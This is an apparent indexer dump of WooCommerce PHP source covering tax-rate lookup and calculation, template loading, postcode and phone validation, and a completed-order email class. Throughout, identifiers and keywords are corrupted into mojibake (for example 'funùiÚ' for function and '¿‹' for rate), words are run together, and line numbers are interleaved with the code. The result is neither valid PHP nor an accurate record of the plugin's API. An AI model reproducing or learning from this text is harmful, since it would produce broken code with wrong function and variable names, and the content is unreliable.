 ] +ğ
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_šc_x_amouÁ', 
$x_amouÁ
, $key, 
$¿‹
, 
$´iû
 );

143  
$xes
;

144 
	}
}

153 
´iv©e
 
funùiÚ
 
	$ÿlc_exşusive_x
Ğ
$´iû
, 
$¿‹s
 ) {

154 
$xes
 = 
	`¬¿y
();

157 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 ) {

159 iàĞ
$¿‹
['compound'] == 'yes' )

162 
$x_amouÁ
 = 
$´iû
 * ( 
$¿‹
['rate'] / 100 );

165 
$x_amouÁ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_ex_x_amouÁ', $x_amouÁ, 
$key
, 
$¿‹
, 
$´iû
 );

168 iàĞ! 
	`is£t
Ğ
$xes
[ 
$key
 ] ) )

169 
$xes
[ 
$key
 ] = 
$x_amouÁ
;

171 
$xes
[ 
$key
 ] +ğ
$x_amouÁ
;

174 
$´e_compound_tÙ®
 = 
	`¬¿y_sum
Ğ
$xes
 );

177 iàĞ
$¿‹s
 ) {

178 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 ) {

180 iàĞ
$¿‹
['compound'] == 'no' )

183 
$the_´iû_šc_x
 = 
$´iû
 + ( 
$´e_compound_tÙ®
 );

185 
$x_amouÁ
 = 
$the_´iû_šc_x
 * ( 
$¿‹
['rate'] / 100 );

188 
$x_amouÁ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_ex_x_amouÁ', $x_amouÁ, 
$key
, 
$¿‹
, 
$´iû
, 
$the_´iû_šc_x
, 
$´e_compound_tÙ®
 );

191 iàĞ! 
	`is£t
Ğ
$xes
[ 
$key
 ] ) )

192 
$xes
[ 
$key
 ] = 
$x_amouÁ
;

194 
$xes
[ 
$key
 ] +ğ
$x_amouÁ
;

198  
$xes
;

199 
	}
}

208 
public
 
funùiÚ
 
fšd_¿‹s
Ğ
$¬gs
 = 
	$¬¿y
() ) {

209 
glob®
 
$wpdb
;

211 
$deçuÉs
 = 
	`¬¿y
(

219 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
$deçuÉs
 );

221 
	`exŒaù
Ğ
$¬gs
, 
EXTR_SKIP
 );

223 iàĞ! 
$couÁry
 )

224  
	`¬¿y
();

227 
$v®id_po¡codes
 = 
	`¬¿y
Ğ'*', 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$po¡code
 ) ) );

230 
$po¡code_Ëngth
 = 
	`¡¾’
Ğ
$po¡code
 );

231 
$wdÿrd_po¡code
 = 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$po¡code
 ) );

233  
$i
 = 0; $˜< 
$po¡code_Ëngth
; $i ++ ) {

235 
$wdÿrd_po¡code
 = 
	`sub¡r
( $wildcard_postcode, 0, -1 );

237 
$v®id_po¡codes
[] = 
$wdÿrd_po¡code
 . '*';

241 
$¿‹s_Œªs›Á_key
 = 'wc_x_¿‹s_' . 
	`md5
Ğ
	`¥rštf
Ğ'%s+%s+%s+%s+%s', 
$couÁry
, 
$¡©e
, 
$c™y
, 
	`im¶ode
Ğ',', 
$v®id_po¡codes
), 
$x_şass
 ) );

242 
$m©ched_x_¿‹s
 = 
	`g‘_Œªs›Á
Ğ
$¿‹s_Œªs›Á_key
 );

244 iàĞ
çl£
 ==ğ
$m©ched_x_¿‹s
 ) {

247 
$found_¿‹s
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
( "

248 
SELECT
 * 
	`FROM
 (

249 
SELECT
 
x_¿‹s
.* 
FROM


250 {
$wpdb
->
´efix
}
woocomm”û_x_¿‹s
 
as
 
x_¿‹s


251 
LEFT
 
OUTER
 
JOIN


252 {
$wpdb
->
´efix
}
woocomm”û_x_¿‹_loÿtiÚs
 
as
 
loÿtiÚs
 
ON
 
x_¿‹s
.
x_¿‹_id
 =†ocations.tax_rate_id

253 
LEFT
 
OUTER
 
JOIN


254 {
$wpdb
->
´efix
}
woocomm”û_x_¿‹_loÿtiÚs
 
as
 
loÿtiÚs2
 
ON
 
x_¿‹s
.
x_¿‹_id
 =†ocations2.tax_rate_id

255 
WHERE


256 
x_¿‹_couÁry
 
	`IN
 ( %
s
, '' )

257 
AND
 
x_¿‹_¡©e
 
	`IN
 ( %
s
, '' )

258 
AND
 
x_¿‹_şass
 = %
s


259 
AND


262 
loÿtiÚs
.
loÿtiÚ_ty³
 
IS
 
NULL


264 
OR


266 
loÿtiÚs
.
loÿtiÚ_ty³
 = 'postcode'

267 
AND
 
loÿtiÚs
.
loÿtiÚ_code
 
	`IN
 ('" . implode( "','", $valid_postcodes ) . "')

268 
AND
 
loÿtiÚs2
.
loÿtiÚ_ty³
 = 'city'

269 
AND
 
loÿtiÚs2
.
loÿtiÚ_code
 = %
s


271 
OR


273 
loÿtiÚs
.
loÿtiÚ_ty³
 = 'postcode'

274 
AND
 
loÿtiÚs
.
loÿtiÚ_code
 
	`IN
 ('" . implode( "','", $valid_postcodes ) . "')

275 
AND
 0 = (

276 
SELECT
 
	`COUNT
(*è
FROM
 {
$wpdb
->
´efix
}
woocomm”û_x_¿‹_loÿtiÚs
 
as
 
subloÿtiÚs


277 
WHERE
 
subloÿtiÚs
.
loÿtiÚ_ty³
 = 'city'

278 
AND
 
subloÿtiÚs
.
x_¿‹_id
 = 
x_¿‹s
.tax_rate_id

281 
OR


283 
loÿtiÚs
.
loÿtiÚ_ty³
 = 'city'

284 
AND
 
loÿtiÚs
.
loÿtiÚ_code
 = %
s


285 
AND
 0 = (

286 
SELECT
 
	`COUNT
(*è
FROM
 {
$wpdb
->
´efix
}
woocomm”û_x_¿‹_loÿtiÚs
 
as
 
subloÿtiÚs


287 
WHERE
 
subloÿtiÚs
.
loÿtiÚ_ty³
 = 'postcode'

288 
AND
 
subloÿtiÚs
.
x_¿‹_id
 = 
x_¿‹s
.tax_rate_id

292 
GROUP
 
BY


293 
x_¿‹_id


294 
ORDER
 
BY


295 
x_¿‹_´iÜ™y
, 
x_¿‹_Üd”


296 è
as
 
Üd”ed_xes


297 
GROUP
 
BY


298 
x_¿‹_´iÜ™y


300 
	`¡¹ouµ”
Ğ
$couÁry
 ),

301 
	`¡¹ouµ”
Ğ
$¡©e
 ),

302 
	`§n™ize_t™Ë
Ğ
$x_şass
 ),

303 
	`¡¹ouµ”
Ğ
$c™y
 ),

304 
	`¡¹ouµ”
Ğ
$c™y
 )

308 
$m©ched_x_¿‹s
 = 
	`¬¿y
();

310 
	`fÜ—ch
 ( 
$found_¿‹s
 
as
 
$found_¿‹
 )

311 
$m©ched_x_¿‹s
[ 
$found_¿‹
->
x_¿‹_id
 ] = 
	`¬¿y
(

312 '¿‹' => 
$found_¿‹
->
x_¿‹
,

313 'Ïb–' => 
$found_¿‹
->
x_¿‹_Çme
,

314 'shpšg' => 
$found_¿‹
->
x_¿‹_shpšg
 ? 'yes' : 'no',

315 'compound' => 
$found_¿‹
->
x_¿‹_compound
 ? 'yes' : 'no'

318 
$m©ched_x_¿‹s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_m©ched_x_¿‹s', $m©ched_x_¿‹s, 
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
, 
$x_şass
 );

320 
	`£t_Œªs›Á
Ğ
$¿‹s_Œªs›Á_key
, 
$m©ched_x_¿‹s
, 
DAY_IN_SECONDS
 );

323  
$m©ched_x_¿‹s
;

324 
	}
}

331 
public
 
funùiÚ
 
g‘_¿‹s
Ğ
$x_şass
 = '' ) {

333 
$x_şass
 = 
§n™ize_t™Ë
( $tax_class );

336 iàĞĞ
defšed
('WOOCOMMERCE_CHECKOUT'è&& 
	gWOOCOMMERCE_CHECKOUT
 ) || ( ! 
em±y
Ğ
WC
()->
cu¡om”
 ) && WC()->
	gcu¡om”
->
has_ÿlcuÏ‹d_shpšg
() ) ) {

338 
li¡
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 ) = 
WC
()->
cu¡om”
->
g‘_xabË_add»ss
();

340 
	g$m©ched_x_¿‹s
 = 
$this
->
fšd_¿‹s
Ğ
¬¿y
(

341 'couÁry' => 
$couÁry
,

342 '¡©e' => 
$¡©e
,

343 'po¡code' => 
$po¡code
,

344 'c™y' => 
$c™y
,

345 'x_şass' => 
$x_şass


353 
	g$m©ched_x_¿‹s
 = 
g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) == 'yes' || get_option( 'woocommerce_default_customer_address' ) == 'base'

354 ? 
$this
->
g‘_shİ_ba£_¿‹
Ğ
$x_şass
 )

355 : 
¬¿y
();

359  
­¶y_f‹rs
('woocomm”û_m©ched_¿‹s', 
$m©ched_x_¿‹s
, 
$x_şass
);

368 
public
 
funùiÚ
 
g‘_shİ_ba£_¿‹
Ğ
$x_şass
 = '' ) {

369  
$this
->
fšd_¿‹s
Ğ
¬¿y
(

370 'couÁry' => 
WC
()->
couÁr›s
->
g‘_ba£_couÁry
(),

371 '¡©e' => 
WC
()->
couÁr›s
->
g‘_ba£_¡©e
(),

372 'po¡code' => 
WC
()->
couÁr›s
->
g‘_ba£_po¡code
(),

373 'c™y' => 
WC
()->
couÁr›s
->
g‘_ba£_c™y
(),

374 'x_şass' => 
$x_şass


384 
public
 
funùiÚ
 
	$g‘_shpšg_x_¿‹s
Ğ
$x_şass
 = 
nuÎ
 ) {

387 iàĞ
$shpšg_x_şass
 = 
	`g‘_İtiÚ
( 'woocommerce_shipping_tax_class' ) ) {

388 
$x_şass
 = 
$shpšg_x_şass
 == 'standard' ? '' : $shipping_tax_class;

391 iàĞĞ
	`defšed
('WOOCOMMERCE_CHECKOUT'è&& 
WOOCOMMERCE_CHECKOUT
 ) || ( ! 
	`em±y
Ğ
	`WC
()->
cu¡om”
 ) && WC()->cu¡om”->
	`has_ÿlcuÏ‹d_shpšg
() ) ) {

393 
	`li¡
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 ) = 
	`WC
()->
cu¡om”
->
	`g‘_xabË_add»ss
();

399 iàĞ
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) == 'yes' || get_option( 'woocommerce_default_customer_address' ) == 'base' ) {

400 
$couÁry
 = 
	`WC
()->
couÁr›s
->
	`g‘_ba£_couÁry
();

401 
$¡©e
 = 
	`WC
()->
couÁr›s
->
	`g‘_ba£_¡©e
();

402 
$po¡code
 = '';

403 
$c™y
 = '';

405  
	`¬¿y
();

411 iàĞ! 
	`is_nuÎ
Ğ
$x_şass
 ) ) {

413 
$m©ched_x_¿‹s
 = 
	`¬¿y
();

416 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

417 'couÁry' => 
$couÁry
,

418 '¡©e' => 
$¡©e
,

419 'po¡code' => 
$po¡code
,

420 'c™y' => 
$c™y
,

421 'x_şass' => 
$x_şass


424 iàĞ
$¿‹s
 )

425 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 )

426 iàĞ
	`is£t
Ğ
$¿‹
['shipping'] ) && $rate['shipping'] == 'yes' )

427 
$m©ched_x_¿‹s
[ 
$key
 ] = 
$¿‹
;

429 iàĞĞ
$m©ched_x_¿‹s
 ) == 0 ) {

431 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

432 'couÁry' => 
$couÁry
,

433 '¡©e' => 
$¡©e
,

434 'c™y' => 
$c™y
,

435 'po¡code' => 
$po¡code
,

438 iàĞ
$¿‹s
 )

439 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 )

440 iàĞ
	`is£t
Ğ
$¿‹
['shipping'] ) && $rate['shipping'] == 'yes' )

441 
$m©ched_x_¿‹s
[ 
$key
 ] = 
$¿‹
;

444  
$m©ched_x_¿‹s
;

449 
$found_x_şas£s
 = 
	`¬¿y
();

450 
$m©ched_x_¿‹s
 = 
	`¬¿y
();

451 
$¿‹s
 = 
çl£
;

454 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 )

455 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$™em
 )

456 
$found_x_şas£s
[] = 
$™em
['d©a']->
	`g‘_x_şass
();

458 
$found_x_şas£s
 = 
	`¬¿y_unique
( $found_tax_classes );

461 iàĞĞ
$found_x_şas£s
 ) > 1 ) {

463 iàĞ
	`š_¬¿y
Ğ'', 
$found_x_şas£s
 ) ) {

464 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

465 'couÁry' => 
$couÁry
,

466 '¡©e' => 
$¡©e
,

467 'c™y' => 
$c™y
,

468 'po¡code' => 
$po¡code
,

471 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

473 
	`fÜ—ch
 ( 
$x_şas£s
 
as
 
$x_şass
 ) {

474 iàĞ
	`š_¬¿y
Ğ
$x_şass
, 
$found_x_şas£s
 ) ) {

475 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

476 'couÁry' => 
$couÁry
,

477 '¡©e' => 
$¡©e
,

478 'po¡code' => 
$po¡code
,

479 'c™y' => 
$c™y
,

480 'x_şass' => 
$x_şass


488 } 
	`–£if
 ( Ğ
$found_x_şas£s
 ) == 1 ) {

490 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

491 'couÁry' => 
$couÁry
,

492 '¡©e' => 
$¡©e
,

493 'po¡code' => 
$po¡code
,

494 'c™y' => 
$c™y
,

495 'x_şass' => 
$found_x_şas£s
[0]

501 iàĞ! 
$¿‹s
 )

502 
$¿‹s
 = 
$this
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

503 'couÁry' => 
$couÁry
,

504 '¡©e' => 
$¡©e
,

505 'po¡code' => 
$po¡code
,

506 'c™y' => 
$c™y
,

509 iàĞ
$¿‹s
 )

510 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 )

511 iàĞ
	`is£t
Ğ
$¿‹
['shipping'] ) && $rate['shipping'] == 'yes' )

512 
$m©ched_x_¿‹s
[ 
$key
 ] = 
$¿‹
;

514  
$m©ched_x_¿‹s
;

517  
	`¬¿y
();

518 
	}
}

526 
public
 
funùiÚ
 
	$is_compound
Ğ
$key
 ) {

527 
glob®
 
$wpdb
;

528  
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECTax_¿‹_compound FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %s", 
$key
 ) ) ? 
Œue
 : 
çl£
;

529 
	}
}

537 
public
 
funùiÚ
 
	$g‘_¿‹_Ïb–
Ğ
$key
 ) {

538 
glob®
 
$wpdb
;

540 
$¿‹_Çme
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECTax_¿‹_ÇmFROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %s", 
$key
 ) );

542 iàĞ! 
$¿‹_Çme
 )

543 
$¿‹_Çme
 = 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

545  
	`­¶y_f‹rs
Ğ'woocomm”û_¿‹_Ïb–', 
$¿‹_Çme
, 
$key
, 
$this
 );

546 
	}
}

555 
public
 
funùiÚ
 
	$g‘_¿‹_code
Ğ
$key
 ) {

556 
glob®
 
$wpdb
;

558 
$¿‹
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %s", 
$key
 ) );

560 iàĞ! 
$¿‹
 ) {

564 
$code
 = 
	`¬¿y
();

566 
$code
[] = 
$¿‹
->
x_¿‹_couÁry
;

567 
$code
[] = 
$¿‹
->
x_¿‹_¡©e
;

568 
$code
[] = 
$¿‹
->
x_¿‹_Çme
 ? $rate->tax_rate_name : 'TAX';

569 
$code
[] = 
	`absšt
Ğ
$¿‹
->
x_¿‹_´iÜ™y
 );

571  
	`­¶y_f‹rs
Ğ'woocomm”û_¿‹_code', 
	`¡¹ouµ”
Ğ
	`im¶ode
Ğ'-', 
	`¬¿y_f‹r
Ğ
$code
 ) ) ), 
$key
, 
$this
 );

572 
	}
}

580 
public
 
funùiÚ
 
	$g‘_x_tÙ®
Ğ
$xes
 ) {

581  
	`¬¿y_sum
Ğ
	`¬¿y_m­
Ğ
	`¬¿y
Ğ
$this
, 'round' ), 
$xes
 ) );

582 
	}
}

	@includes/class-wc-template-loader.php

1 <?
php


11 şas 
	cWC_Tem¶©e_Lßd”
 {

16 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

17 
	`add_f‹r
Ğ'‹m¶©e_šşude', 
	`¬¿y
Ğ
$this
, 'template_loader' ) );

18 
	`add_f‹r
Ğ'comm’ts_‹m¶©e', 
	`¬¿y
Ğ
$this
, 'comments_template_loader' ) );

36 
public
 
funùiÚ
 
	$‹m¶©e_lßd”
Ğ
$‹m¶©e
 ) {

37 
$fšd
 = 
	`¬¿y
( 'woocommerce.php' );

38 
$fe
 = '';

40 iàĞ
	`is_sšgË
(è&& 
	`g‘_po¡_ty³
() == 'product' ) {

42 
$fe
 = 'single-product.php';

43 
$fšd
[] = 
$fe
;

44 
$fšd
[] = 
WC_TEMPLATE_PATH
 . 
$fe
;

46 } 
	`–£if
 ( 
	`is_x
( 'product_cat' ) || is_tax( 'product_tag' ) ) {

48 
$‹rm
 = 
	`g‘_qu”›d_objeù
();

50 
$fe
 = 'xÚomy-' . 
$‹rm
->
xÚomy
 . '.php';

51 
$fšd
[] = 'xÚomy-' . 
$‹rm
->
xÚomy
 . '-' . $‹rm->
¦ug
 . '.php';

52 
$fšd
[] = 
WC_TEMPLATE_PATH
 . 'xÚomy-' . 
$‹rm
->
xÚomy
 . '-' . $‹rm->
¦ug
 . '.php';

53 
$fšd
[] = 
$fe
;

54 
$fšd
[] = 
WC_TEMPLATE_PATH
 . 
$fe
;

56 } 
	`–£if
 ( 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) || 
	`is_·ge
Ğ
	`wc_g‘_·ge_id
( 'shop' ) ) ) {

58 
$fe
 = 'archive-product.php';

59 
$fšd
[] = 
$fe
;

60 
$fšd
[] = 
WC_TEMPLATE_PATH
 . 
$fe
;

64 iàĞ
$fe
 ) {

65 
$‹m¶©e
 = 
	`loÿ‹_‹m¶©e
Ğ
$fšd
 );

66 
$¡©us_İtiÚs
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_¡©us_İtiÚs', 
	`¬¿y
() );

67 iàĞ! 
$‹m¶©e
 || ( ! 
	`em±y
Ğ
$¡©us_İtiÚs
['‹m¶©e_debug_mode'] ) && 
	`cu¼’t_u£r_ÿn
( 'manage_options' ) ) )

68 
$‹m¶©e
 = 
	`WC
()->
	`¶ugš_·th
(è. '/‹m¶©es/' . 
$fe
;

71  
$‹m¶©e
;

72 
	}
}

80 
public
 
funùiÚ
 
	$comm’ts_‹m¶©e_lßd”
Ğ
$‹m¶©e
 ) {

81 iàĞ
	`g‘_po¡_ty³
() !== 'product' )

82  
$‹m¶©e
;

84 iàĞ
	`fe_exi¡s
Ğ
STYLESHEETPATH
 . '/' . 
WC_TEMPLATE_PATH
 . 'single-product-reviews.php' ))

85  
STYLESHEETPATH
 . '/' . 
WC_TEMPLATE_PATH
 . 'single-product-reviews.php';

86 
	`–£if
 ( 
	`fe_exi¡s
Ğ
TEMPLATEPATH
 . '/' . 
WC_TEMPLATE_PATH
 . 'single-product-reviews.php' ))

87  
TEMPLATEPATH
 . '/' . 
WC_TEMPLATE_PATH
 . 'single-product-reviews.php';

88 
	`–£if
 ( 
	`fe_exi¡s
Ğ
STYLESHEETPATH
 . '/' . 'single-product-reviews.php' ))

89  
STYLESHEETPATH
 . '/' . 'single-product-reviews.php';

90 
	`–£if
 ( 
	`fe_exi¡s
Ğ
TEMPLATEPATH
 . '/' . 'single-product-reviews.php' ))

91  
TEMPLATEPATH
 . '/' . 'single-product-reviews.php';

93  
	`WC
()->
	`¶ugš_·th
() . '/templates/single-product-reviews.php';

94 
	}
}

97 
Ãw
 
WC_Tem¶©e_Lßd”
();

	@includes/class-wc-validation.php

1 <?
php


11 şas 
	cWC_V®id©iÚ
 {

19 
public
 
funùiÚ
 
	$is_ema
Ğ
$ema
 ) {

20  
	`is_ema
Ğ
$ema
 );

29 
public
 
funùiÚ
 
	$is_phÚe
Ğ
$phÚe
 ) {

30 iàĞ
	`¡¾’
Ğ
	`Œim
Ğ
	`´eg_»¶aû
Ğ'/[\s\#0-9_\-\+\(\)]/', '', 
$phÚe
 ) ) ) > 0 )

31  
çl£
;

33  
Œue
;

34 
	}
}

43 
public
 
funùiÚ
 
	$is_po¡code
Ğ
$po¡code
, 
$couÁry
 ) {

44 iàĞ
	`¡¾’
Ğ
	`Œim
Ğ
	`´eg_»¶aû
Ğ'/[\s\-A-Za-z0-9]/', '', 
$po¡code
 ) ) ) > 0 )

45  
çl£
;

47  
$couÁry
 ) {

49  
£lf
::
	`is_GB_po¡code
Ğ
$po¡code
 );

51 iàĞ
	`´eg_m©ch
Ğ"/^([0-9]{5})(-[0-9]{4})?$/i", 
$po¡code
 ) )

52  
Œue
;

54  
çl£
;

56 iàĞ
	`´eg_m©ch
Ğ"/^([0-9]{4})$/i", 
$po¡code
 ) )

57  
Œue
;

59  
çl£
;

61 iàĞ
	`´eg_m©ch
Ğ"/^([0-9]{5,5})([-])?([0-9]{3,3})$/", 
$po¡code
 ) )

62  
Œue
;

64  
çl£
;

67  
Œue
;

68 
	}
}

78 
public
 
funùiÚ
 
	$is_GB_po¡code
Ğ
$toCheck
 ) {

81 
$®pha1
 = "[abcdefghijklmnoprstuwyz]";

82 
$®pha2
 = "[abcdefghklmnopqrstuvwxy]";

83 
$®pha3
 = "[abcdefghjkstuw]";

84 
$®pha4
 = "[abehmnprvwxy]";

85 
$®pha5
 = "[abdefghjlnpqrstuwxyz]";

88 
$pûxp
[0] = '/^('.
$®pha1
.'{1}'.
$®pha2
.'{0,1}[0-9]{1,2})([0-9]{1}'.
$®pha5
.'{2})$/';

91 
$pûxp
[1] = '/^('.
$®pha1
.'{1}[0-9]{1}'.
$®pha3
.'{1})([0-9]{1}'.
$®pha5
.'{2})$/';

94 
$pûxp
[2] = '/^('.
$®pha1
.'{1}'.
$®pha2
.'[0-9]{1}'.
$®pha4
.')([0-9]{1}'.
$®pha5
.'{2})$/';

97 
$pûxp
[3] = '/^(gir)(0aa)$/';

100 
$pûxp
[4] = '/^(bfpo)([0-9]{1,4})$/';

103 
$pûxp
[5] = '/^(bfpo)(c\/o[0-9]{1,3})$/';

106 
$po¡code
 = 
	`¡¹Şow”
Ğ
$toCheck
 );

107 
$po¡code
 = 
	`¡r_»¶aû
 (' ', '', $postcode);

110 
$v®id
 = 
çl£
;

113 
	`fÜ—ch
 ( 
$pûxp
 
as
 
$»gexp
 ) {

115 iàĞ
	`´eg_m©ch
Ğ
$»gexp
, 
$po¡code
, 
$m©ches
 ) ) {

118 
$toCheck
 = 
	`¡¹ouµ”
 (
$m©ches
[1] . ' ' . $matches [2]);

121 
$toCheck
 = 
	`¡r_»¶aû
( 'C/O', 'c/o ', $toCheck );

124 
$v®id
 = 
Œue
;

129  
$v®id
;

130 
	}
}

139 
public
 
funùiÚ
 
	$fÜm©_po¡code
Ğ
$po¡code
, 
$couÁry
 ) {

140 
	`wc_fÜm©_po¡code
Ğ
$po¡code
, 
$couÁry
 );

141 
	}
}

150 
public
 
funùiÚ
 
	$fÜm©_phÚe
Ğ
$‹l
 ) {

151 
	`wc_fÜm©_phÚe_numb”
Ğ
$‹l
 );

152 
	}
}

	@includes/emails/class-wc-email-customer-completed-order.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_Completed_Order' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_Com¶‘ed_Ord”
 
ex‹nds
 
WC_Ema
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

25 
$this
->
id
 = 'customer_completed_order';

26 
$this
->
t™Ë
 = 
	`__
( 'Completed order', 'woocommerce' );

27 
$this
->
desütiÚ
 = 
	`__
( 'Order completeƒmails‡re sentohe customer whenhe order is marked complete‡nd usual indicateshathe order has been shipped.', 'woocommerce' );

29 
$this
->
h—dšg
 = 
	`__
( 'Your order is complete', 'woocommerce' );

30 
$this
->
subjeù
 = 
	`__
( 'Your {site_title} order from {order_date} is complete', 'woocommerce' );

32 
$this
->
‹m¶©e_html
 = 'emails/customer-completed-order.php';

33 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-completed-order.php';

36 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_com¶‘ed_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

39 
$this
->
h—dšg_dowÆßdabË
 = $this->
	`g‘_İtiÚ
Ğ'h—dšg_dowÆßdabË', 
	`__
( 'Your order is complete - download your files', 'woocommerce' ) );

40 
$this
->
subjeù_dowÆßdabË
 = $this->
	`g‘_İtiÚ
Ğ'subjeù_dowÆßdabË', 
	`__
( 'Your {site_title} order from {order_date} is complete - download your files', 'woocommerce' ) );

43 
·»Á
::
	`__cÚ¡ruù
();

52 
funùiÚ
 
	$Œigg”
Ğ
$Üd”_id
 ) {

54 iàĞ
$Üd”_id
 ) {

55 
$this
->
objeù
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

56 
$this
->
»c›Á
 = $this->
objeù
->
blšg_ema
;

58 
$this
->
fšd
[] = '{order_date}';

59 
$this
->
»¶aû
[] = 
	`d©e_i18n
Ğ
	`wc_d©e_fÜm©
(), 
	`¡¹Ùime
Ğ$this->
objeù
->
Üd”_d©e
 ) );

61 
$this
->
fšd
[] = '{order_number}';

62 
$this
->
»¶aû
[] = $this->
objeù
->
	`g‘_Üd”_numb”
();

65 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

68 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

69 
	}
}

77 
funùiÚ
 
	$g‘_subjeù
() {

78 iàĞ! 
	`em±y
Ğ
$this
->
objeù
 ) && $this->objeù->
	`has_dowÆßdabË_™em
() )

79  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_cu¡om”_com¶‘ed_Üd”', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
subjeù_dowÆßdabË
 ), $this->
objeù
 );

81  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_cu¡om”_com¶‘ed_Üd”', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
subjeù
 ), $this->
objeù
 );

82 
	}
}

90 
funùiÚ
 
	$g‘_h—dšg
() {

91 iàĞ! 
	`em±y
Ğ
$this
->
objeù
 ) && $this->objeù->
	`has_dowÆßdabË_™em
() )

92  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—dšg_cu¡om”_com¶‘ed_Üd”', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
h—dšg_dowÆßdabË
 ), $this->
objeù
 );

94  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—dšg_cu¡om”_com¶‘ed_Üd”', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
h—dšg
 ), $this->
objeù
 );

95 
	}
}

103 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

104 
	`ob_¡¬t
();

105 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

106 'Üd”' => 
$this
->
objeù
,

107 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

108 '£Á_to_admš' => 
çl£
,

109 '¶aš_‹xt' => 
çl£


111  
	`ob_g‘_ş—n
();

112 
	}
}

120 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

121 
	`ob_¡¬t
();

122 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

123 'Üd”' => 
$this
->
objeù
,

124 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

125 '£Á_to_admš' => 
çl£
,

126 '¶aš_‹xt' => 
Œue


128  
	`ob_g‘_ş—n
();

129 
	}
}

137 
funùiÚ
 
	$š™_fÜm_f›lds
() {

138 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

139 '’abËd' => 
	`¬¿y
(

140 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

142 'Ïb–' => 
	`__
( 'Enablehisƒmail‚otification', 'woocommerce' ),

145 'subjeù' => 
	`¬¿y
(

146 't™Ë' => 
	`__
( 'Subject', 'woocommerce' ),

148 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
subjeù
 ),

152 'h—dšg' => 
	`¬¿y
(

153 't™Ë' => 
	`__
( 'Email Heading', 'woocommerce' ),

155 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
h—dšg
 ),

159 'subjeù_dowÆßdabË' => 
	`¬¿y
(

160 't™Ë' => 
	`__
